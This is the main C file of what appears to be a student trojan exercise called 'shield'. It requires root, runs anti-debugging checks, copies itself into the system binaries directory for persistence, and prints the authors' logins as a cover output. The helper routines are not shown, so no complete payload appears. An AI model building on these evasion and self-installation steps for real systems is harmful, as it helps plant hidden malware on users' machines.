/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
/*   Updated: 2025/03/23 03:49:54 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <shield.h>
#include <stdio.h>
#include <unistd.h>

#define LOGINS "kiroussa & lvincent"

/**
 * @brief	Malicious intents. 
 *
 * This function will:
 *	- Copy the program to the system's binaries directory.
 *	- 
 * 
 */
static inline void	shield_malicious_intents(void)
{
	if (!shield_antidebug())
		return ;
	if (!shield_copy())
		return ;
	if (!shield_antidebug())
		return ;
}

int	main(void)
{
	const int	euid = geteuid();

	if (!DEBUG && euid != 0)
	{
		puts("You need to run this program as root!");
		return (1);
	}
	if (shield_antidebug())
		shield_malicious_intents();
	puts(LOGINS);
	return (0);
}
